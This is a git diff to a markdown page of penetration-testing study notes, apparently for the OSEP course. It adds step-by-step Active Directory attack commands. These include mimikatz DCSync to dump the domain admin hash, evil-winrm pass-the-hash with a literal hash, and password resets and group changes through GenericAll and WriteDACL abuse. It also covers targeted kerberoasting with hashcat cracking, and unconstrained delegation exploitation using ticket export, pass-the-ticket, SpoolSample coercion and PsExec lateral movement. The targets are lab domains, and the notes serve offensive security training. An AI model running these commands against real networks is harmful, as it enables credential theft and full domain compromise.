@@ -429,18 +429,13 @@ $com.Run("mymacro")
 
 <details>
 
-<summary>Dump Password Hashes from Domain Controller</summary>
+<summary>Dump Domain Admin Hash from DC</summary>
 
 ```bash
 mimikatz.exe
-```
-
-```bash
 privilege::debug
-```
-
-```bash
-lsadump::dcsync /all /csv
+lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator
+evil-winrm  -i 192.168.70.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e
 ```
 
 </details>
@@ -467,6 +462,8 @@ runas /user:corp\jen powershell.exe
 ```
 
 </details>
+
+## OSEP Notes below
 
 <details>
 
@@ -579,5 +576,134 @@ runas /user:corp\jen powershell.exe
   * ```bash
     kvno MSSQLSvc/DC01.corp1.com:1433
     ```
+
+</details>
+
+<details>
+
+<summary>Abusing GenericAll</summary>
+
+## For Domain User
+
+* Change password of an account
+  *   ```powershell
+      net user testservice1 P@ssw0rd /domain
+      ```
+
+
+* Spawn new powershell.exe in context of testservice1
+  *   ```powershell
+      runas /user:prod\testservice1 powershell.exe
+      ```
+
+
+
+## For Domain Group
+
+* ```powershell
+  net group testgroup offsec /add /domain
+  ```
+
+</details>
+
+<details>
+
+<summary>Exploiting WriteDACL</summary>
+
+* Can add new access rights like GenericAll, GenericWrite, or even DCSync
+* Adding GenericAll rights:
+  * ```powershell
+    Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
+    ```
+
+</details>
+
+<details>
+
+<summary>Exploiting GenericWrite on Another User</summary>
+
+* Able to set a service principal name and kerberoast that account
+  *   ```powershell
+      ./targetedKerberoast.py --dc-ip '192.168.170.70' -v -d 'prod.corp1.com' -u 'offsec' -p 'lab'
+      ```
+
+
+* Obtain TGS-REP hash
+  * ```bash
+    hashcat -m 13100 hash.txt rockyou.txt
+    ```
+
+</details>
+
+<details>
+
+<summary>Unconstrained Delegation</summary>
+
+![](<../.gitbook/assets/image (313).png>)
+
+* Allows forwardable TGT --> frontend service is able to perform authentication on behalf of user to any service
+
+## Enumeration
+
+```powershell
+Import-Module powerview.ps1
+Get-DomainComputer -Unconstrained
+
+#To know the IP of the target
+nslookup appsrv01
+```
+
+## Exploitation
+
+* Must be local admin on the target (eg: appsrv01)
+*   2 methods
+
+    * Have domain admin visit the application using uncontrained kerberoast --> dump TGT of admin
+      *   ```
+          sekurlsa::tickets
+          ```
+
+          <figure><img src="../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>
+
+
+      *   ```
+          sekurlsa::tickets /export
+          ```
+
+          <figure><img src="../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>
+
+
+      *   ```
+          kerberos::ptt [0;1801fa]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
+          ```
+
+          <figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>
+
+
+      *   ```powershell
+          exit
+          # Verify that we have the TGT
+          klist
+          # Laterally move to DC
+          C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd.exe
+          ```
+
+
+
+
+
+    * Force high-privileged authentication without any user interaction (PrintSpooler)
+      *   ```powershell
+          Rubeus.exe monitor /interval:5 /filteruser:CDC01$
+          SpoolSample.exe <target-machine> <capture-server>
+              #SpoolSample.exe CDC01 APPSRV01
+          Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo…
+          ```
+
+
+      * Since machine account (CDC01$) is not local admin on DC, can't laterally move to it
+      * Can laterally move via:
+        * [Golden Ticket](persistence.md#golden-ticket)
+        * [Dump administrator hash](lateral-movement.md#dump-domain-admin-hash-from-dc)
 
 </details>
